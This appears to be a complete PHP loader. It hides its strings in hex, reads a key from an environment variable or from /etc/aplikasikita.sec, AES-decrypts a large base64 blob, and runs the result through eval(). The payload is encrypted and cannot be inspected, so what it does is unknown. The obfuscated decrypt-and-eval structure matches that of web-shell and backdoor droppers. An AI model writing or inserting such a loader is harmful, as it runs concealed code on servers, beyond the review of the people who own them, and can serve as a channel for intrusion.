<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('O1UeY/EOq4bGclUGcWE0xg==');

$c=base64_decode(

'AAWjyigpxZbHPoicS2waDA6Q+Fwin9/wC1VRlRcUcSf2cD4pwz9GSbH7cEAyTNDP6w3Ytd4MX+2f' .
'DJ4aeMbJN8Bezf99Vpysc9Lsgk2CLSs7EV8qxKs6By2thKTi65jA3DikDNQNqRNFkuVKcvpkHrQq' .
'SHHY84ZTmAK9zaQ94saw7Zj5yKuU21ybz0Gsb4+1qZbcgaaptBWbSqGRYgkxchjEJ3ZQl3DUe39E' .
'NFPnAlaTd3wLuUg376EpzUSwsFTEOVHCYo4eO7ULGG1cGUKMQnOxKj/OBHnkmVRGBui3qeoMUYKl' .
'wx3yhBKFjziyHTeVoG/eMSlXxtcCExwQcy8wlgZQnNcCjyy2W76C0HM8L6Y8L5ARsdPrSG2cThbs' .
'MAd+9x0kHiFUxoCgDf0YvBEWFMqjy0SjTu5dP3JYoqr3RN3QfdFteSfDEEkpEPOGVAsKeWGGyoIu' .
'JF4MlsPBV7YmXIa2n4YY10/XWR+K62H8ijP4FrMzNL64BvH6GDAYU76LUu24Jn96AOXLnLtQtJBz' .
'5AYy64dOjZernK0vRVERuSkHXm3xwBD5RyFPFz6LksxiVEs7ffYAZEdtvIQcjeY/1TwyKRafqwR3' .
'cjBwVMOoLpESo2XawZFiaX/PemF6TLg56seK/3s/bfOHGKrTIJpVgAmQMXJLVirmg4L/LnbHZa8p' .
'901rEqIxRkKveorMMLLrFriQNPmVh6SmJ5mVvKkP2peoCrsZ/k+DnHF/AmPFj586MlFadDa1L21z' .
'q0NeSwGTAi1K0V+TGbomLP5zGnhlZIZ7rVbOoFq3u21TaCLQ3KpOwBW7gKiYzGj+0BP910yxqIhS' .
'aS7dntSx7b50ota0F5ZlYofirk5Pdte1LkfFJ8yVB/qBOuFUcskqR1lUYttB3CGMKGD9x5F6A6LB' .
'TO+Y7W/5sz6xS+YDeeU9lezsA/59HyStZ9HTQHKhXtMTAx8pE/+tqYyKJV52Fo2D49m9SZZCrCLG' .
'mzu9Z24SJ6INZp7+/elF4lSOEib0agdNDU/MpVF4giN4jFSVLHJ4x1D6JWv0OtPbZLbQ5OKWLmkv' .
'pchO/K5FSs27baT3p8tuv028nDfGdvGyh/UYKhd0sBYgqi9llvrYvVr2IdfCjPuk0t8kwDTf9igH' .
'jguyuqvgY/1fmEIRcAjQVZJvnTiqDwe0f3hGSe/uAZfqCqsGoAZbIHQk9rv55NKxpJDVElKapibZ' .
'kjxQes7oPAhBDLkZzbK5doXHXyLiZYKXQVNiCK0TGiGKWhC/i3wpUV3eWsJvLytE2w/ygVSs+LAh' .
'dv6JNJjsxIa8xJEfe8NQ5iSPmYhf61roQP5txLOLcQYhH3NpVijX+W8DQKqoHVr4WZycT/ODtg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

